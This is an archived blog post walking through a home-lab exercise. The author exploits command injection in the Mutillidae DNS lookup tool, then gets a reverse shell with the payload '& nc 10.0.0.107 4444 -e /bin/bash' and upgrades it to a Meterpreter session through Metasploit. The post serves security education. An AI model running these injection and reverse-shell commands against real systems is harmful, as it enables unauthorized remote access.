---
layout: archive
title: "Reverse Shell via Command Injection"
date: 2018-06-15
description: "Lab walkthrough — discovering and exploiting command injection to establish a reverse shell."
original_url: https://playingwithpackets.com/commandinjection/
archived: true
---

Hello Internet! I was first introduced to the command injection vulnerability when I took Peter Kim's Ethical Hacking 101 class last year in November. Prior to this I wasn't too familiar with web application vulnerabilities so I thought I would write about it to enhance my understanding.

## The Setup

I wanted to setup the infrastructure to replicate a real world scenario as much as possible. Instead of putting all devices on the same network segment, I used PfSense to create two networks; 10.0.0.0/24 and 192.168.1.0/24. The attacker will use the WAN IP of 10.0.0.109 to access the Mutillidae web application which is on the internal LAN IP of 192.168.1.101. This configuration mimics most web servers since they use port forwarding in order for users to access their services over the Internet.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/network-diagram.png" alt="Lab topology: attacker WAN, PfSense firewall, and the Mutillidae web server on the LAN" caption="The lab — a PfSense firewall separates the attacker's 10.0.0.0/24 WAN from the 192.168.1.0/24 LAN hosting Mutillidae; port forwarding mirrors a real internet-facing web app." %}

## Discovery

We will use Nmap to perform some reconnaissance on our target to see what services are running and what ports are open.

Open up a terminal and enter the following:

```
nmap -sV -O -v 10.0.0.109
```

The `-sV` switch will see what services/ports are running, the `-O` switch will detect what OS is running and the `-v` switch enables verbosity which provides more output information. From our results we can see that port 80 (http) is open, using Apache as the web server, and Linux as the OS.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/nmap-scan.png" alt="nmap -sV -O -v output showing port 80/http open on an Apache, Linux host" caption="nmap confirms port 80/http open (Apache) on a Linux host — the web app is the way in." %}

Let's see what it looks like through a web browser. Since we already know we'll be using Mutillidae we can go ahead and navigate to the DNS Lookup web application.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/mutillidae-home.png" alt="Metasploitable2 landing page loaded in Firefox at 10.0.0.109" caption="The target's web root in a browser — Metasploitable2's landing page links straight to the Mutillidae app." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/dns-lookup-app.png" alt="Mutillidae DNS Lookup page with a hostname/IP input field" caption="Mutillidae's DNS Lookup tool passes whatever you enter to the host OS — the sink we'll target for command injection." %}

## Testing

The way this web application works is by passing on the command from the web application to the OS of the server it is hosted on. Without proper sanitization or input validation, arbitrary OS commands can be executed by anyone over the Internet. Vulnerabilities like this increase the attack surface and serve as another entry point into someone's network.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/dns-lookup-test.png" alt="DNS Lookup results for 8.8.8.8 resolving to google-public-dns-a.google.com" caption="Baseline — a plain lookup of 8.8.8.8 resolves normally, confirming the tool shells out to the OS resolver." %}

There are a few ways to test for OS command injection. We can use metacharacters which are special characters that hold a specific meaning within the context of a computer program. Using `&` which separates multiple commands on one command line:

```
8.8.8.8 & netstat
```

After inputting this, the IP address is resolved and the netstat command returns a list of active network connections on the web server.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/netstat-injection.png" alt="DNS Lookup output for '8.8.8.8 & netstat' showing the resolution plus active connections" caption="Injecting `8.8.8.8 & netstat` returns the lookup AND the server's active connections — arbitrary OS commands now run under the web app." %}

The same metacharacter trick works with any command. Substituting `ls` enumerates the web application's directory on disk:

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/ls-injection.png" alt="DNS Lookup output for '8.8.8.8 & ls' listing the Mutillidae web directory" caption="`8.8.8.8 & ls` lists the Mutillidae web root — note files like `process-commands.php` and `captured-data.txt`." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/ls-injection-2.png" alt="Remainder of the directory listing returned by the ls injection" caption="…the rest of the listing returned inline below the normal lookup output." %}

## Reverse Shell

Since we know the web server reaches out to the Internet to resolve IP addresses to domain names, we can infer that there are no egress firewall rules blocking outbound traffic. A reverse shell is when you use the victim's machine to establish a connection to the attacking machine, commonly used to bypass firewalls. We can utilize netcat for this.

Set up a listener on the Kali box:

```
nc -lvp 4444
```

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/netcat-listener.png" alt="Kali terminal running nc -lvp 4444 and listening" caption="On Kali: a netcat listener waits on 4444 for the callback." %}

On the vulnerable web server application, input the following command:

```
& nc 10.0.0.107 4444 -e /bin/bash
```

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/reverse-shell-injection.png" alt="DNS Lookup page after submitting the netcat command, returning no output" caption="Submitting `& nc 10.0.0.107 4444 -e /bin/bash` returns a blank page — the request hangs because it's now piping a shell back to Kali." %}

The `&` is the command separator, `nc` is the netcat command, `10.0.0.107` is the IP of the Kali box, `4444` is the listening port, and `-e /bin/bash` executes a bash shell back to the listener.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/reverse-shell.png" alt="Kali netcat listener receiving the connection and running ls on the victim" caption="The listener catches the connection — running `ls` lists the victim's web directory through the reverse shell." %}

## Bonus: Upgrade to Meterpreter Shell

Now that we have confirmed we can obtain a shell on our target, we can upgrade to a Meterpreter shell using Metasploit.

```
msfconsole
use exploit/multi/handler
set LHOST 10.0.0.107
set LPORT 4444
set payload linux/x86/shell/reverse_tcp
run
```

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-01.png" alt="msfconsole banner after launch" caption="Launching Metasploit with `msfconsole`." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-02.png" alt="Selecting the multi/handler exploit module" caption="`use exploit/multi/handler` — the module that catches an incoming shell." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-03.png" alt="Setting LHOST and LPORT on the handler" caption="Point the handler at the Kali box: `LHOST 10.0.0.107`, `LPORT 4444`." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-04.png" alt="Setting the linux/x86/shell/reverse_tcp payload" caption="Match the payload to the shell being caught: `linux/x86/shell/reverse_tcp`." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-05.png" alt="Running the handler — started reverse TCP handler" caption="`run` starts the reverse TCP handler on 10.0.0.107:4444 and waits." %}

Execute the same netcat command on the web application, then background the shell with `Ctrl+Z` and upgrade with `sessions -u 1`. Use the Meterpreter session with `sessions -i 2`.

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-06.png" alt="Command shell session 1 opened in Metasploit" caption="Re-running the netcat injection lands command shell session 1 on the handler." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-07.png" alt="Backgrounding session 1 with Ctrl+Z" caption="`Ctrl+Z` backgrounds the raw shell so it can be upgraded." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-08.png" alt="Upgrading session 1 to Meterpreter with sessions -u 1" caption="`sessions -u 1` runs shell_to_meterpreter — Meterpreter session 2 opens." %}

{% include post-screenshot.html src="/assets/img/posts/reverse-shell-via-command-injection/meterpreter-09.png" alt="Interacting with the Meterpreter session" caption="`sessions -i 2` drops into the Meterpreter prompt — full post-exploitation access." %}

## Recap

- Performed information gathering using Nmap
- Discovered web server running on port 80
- Tested for and confirmed OS command injection vulnerability
- Established a reverse shell connection from web server to Kali box
- Upgraded reverse shell to Meterpreter shell

## Resources

- [SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
- [OWASP Command Injection](https://www.owasp.org/index.php/Command_Injection)
